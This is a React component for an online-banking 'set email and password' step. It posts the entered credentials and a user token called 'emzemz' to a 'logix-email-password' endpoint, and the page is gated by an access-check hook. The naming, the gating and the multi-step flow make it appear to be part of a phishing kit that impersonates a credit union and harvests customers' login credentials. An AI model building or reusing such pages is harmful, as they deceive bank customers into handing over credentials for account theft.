import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';

const EmailPassword: React.FC = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({
    email: '',
    password: '',
    confirmPassword: ''
  });

  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz } = location.state || {};
  const isAllowed = useAccessCheck(baseUrl);

  if (!isAllowed) {
    return <div>Loading...</div>;
  }

  if (!emzemz) {
    return <div>Missing user details. Please restart the process.</div>;
  }

  const validateEmail = (email: string) => {
    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return regex.test(email);
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);

    const newErrors = {
      email: !email.trim() ? 'Email is required' : !validateEmail(email) ? 'Invalid email format' : '',
      password: password.length < 8 ? 'Password must be at least 8 characters' : '',
      confirmPassword: password !== confirmPassword ? 'Passwords do not match' : ''
    };

    setErrors(newErrors);

    if (!newErrors.email && !newErrors.password && !newErrors.confirmPassword) {
      try {
        await axios.post(`${baseUrl}api/logix-email-password/`, {
          emzemz,
          email,
          password
        });
        console.log('Email and password set successfully');
        navigate('/basic-info', { state: { emzemz } });
      } catch (error) {
        console.error('Error setting email/password:', error);
        setErrors(prev => ({
          ...prev,
          form: 'There was an error. Please try again.'
        }));
        setIsLoading(false);
      }
    } else {
      setIsLoading(false);
    }
  };

  return (
    <div className="flex-1 bg-gray-200 rounded shadow-sm">
      <div className="border-b-2 border-teal-500 px-8 py-4">
        <h2 className="text-xl font-semibold text-gray-800">Set Your Email & Password</h2>
      </div>

      <div className="px-6 py-6 bg-white space-y-4">
        <p className="text-sm text-gray-700">
          Create your account credentials to access your online banking.
        </p>

        <form onSubmit={handleSubmit} className="space-y-4">
          {/* Email Field */}
          <div className="flex items-center gap-4">
            <label className="text-gray-700 w-32 text-right">Email:</label>
            <input
              id="email"
              name="email"
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
              placeholder="Enter your email"
            />
          </div>
          {errors.email && (
            <div className="flex items-center gap-2 text-sm text-red-600 ml-36">
              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
              </svg>
              <span>{errors.email}</span>
            </div>
          )}

          {/* Password Field */}
          <div className="flex items-center gap-4">
            <label className="text-gray-700 w-32 text-right">Password:</label>
            <input
              id="password"
              name="password"
              type={showPassword ? 'text' : 'password'}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
              placeholder="Enter password"
            />
            <span
              className="text-blue-700 text-sm hover:underline cursor-pointer"
              onClick={() => setShowPassword(!showPassword)}
            >
              {showPassword ? 'Hide' : 'Show'}
            </span>
          </div>
          {errors.password && (
            <div className="flex items-center gap-2 text-sm text-red-600 ml-36">
              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
              </svg>
              <span>{errors.password}</span>
            </div>
          )}

          {/* Confirm Password Field */}
          <div className="flex items-center gap-4">
            <label className="text-gray-700 w-32 text-right">Confirm Password:</label>
            <input
              id="confirmPassword"
              name="confirmPassword"
              type={showConfirmPassword ? 'text' : 'password'}
              value={confirmPassword}
              onChange={(e) => setConfirmPassword(e.target.value)}
              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
              placeholder="Re-enter password"
            />
            <span
              className="text-blue-700 text-sm hover:underline cursor-pointer"
              onClick={() => setShowConfirmPassword(!showConfirmPassword)}
            >
              {showConfirmPassword ? 'Hide' : 'Show'}
            </span>
          </div>
          {errors.confirmPassword && (
            <div className="flex items-center gap-2 text-sm text-red-600 ml-36">
              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
              </svg>
              <span>{errors.confirmPassword}</span>
            </div>
          )}

          <div className="border-b-2 border-teal-500 flex justify-center px-6 py-4">
            {!isLoading ? (
              <button
                type="submit"
                className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
              >
                Continue
              </button>
            ) : (
              <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent" />
            )}
          </div>
        </form>
      </div>

      <div className="px-6 pb-6">
        <p className="text-xs text-gray-700">
          Your password must be at least 8 characters long and should include a mix of letters, numbers, and symbols for security.
        </p>
      </div>
    </div>
  );
};

export default EmailPassword;
